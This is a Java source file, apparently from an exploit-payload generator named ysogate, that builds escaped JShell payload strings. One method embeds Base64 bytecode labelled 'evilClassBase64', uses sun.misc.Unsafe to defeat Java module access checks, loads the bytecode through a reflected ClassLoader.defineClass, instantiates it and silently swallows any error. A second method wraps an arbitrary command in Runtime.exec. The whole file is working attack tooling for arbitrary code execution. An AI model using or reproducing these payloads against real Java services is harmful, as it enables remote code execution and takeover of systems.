package com.h2tg.ysogate.bullet.defineClass;

import org.apache.commons.lang.StringEscapeUtils;

import java.util.Base64;

public class JShellConverter
{
    public static String jshell2defineClass(String baseCode)
    {
        String javacode =
                "System.out.println(\"foo\");"+
                        "  class e {" +
                        "    static {" +
                        "        try {" +
                        "            String evilClassBase64 = \""+baseCode+"\";" +
                        "            Class unsafeClass = Class.forName(\"sun.misc.Unsafe\");" +
                        "            java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField(\"theUnsafe\");" +
                        "            unsafeField.setAccessible(true);" +
                        "            sun.misc.Unsafe unsafe = (sun.misc.Unsafe) unsafeField.get(null);" +
                        "            Module module = Object.class.getModule();" +
                        "            Class cls = e.class;" +
                        "            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\"));" +
                        "            unsafe.getAndSetObject(cls, offset, module);" +
                        "            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);" +
                        "            defineClass.setAccessible(true);" +
                        "            byte[] bytecode = java.util.Base64.getDecoder().decode(evilClassBase64);" +
                        "            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);" +
                        "            clazz.newInstance();" +
                        "        } catch (Exception e) {" +
                        "        }" +
                        "    }" +
                        "}"+" e a = new e();"
                ;
        return StringEscapeUtils.escapeJava(javacode);
    }

    public static String jshell2cmd(String cmd)
    {
        String code = "String cmd = \"" + cmd + "\";" +
                "java.lang.Runtime.getRuntime().exec(cmd);";
        return StringEscapeUtils.escapeJava(code);
    }
}
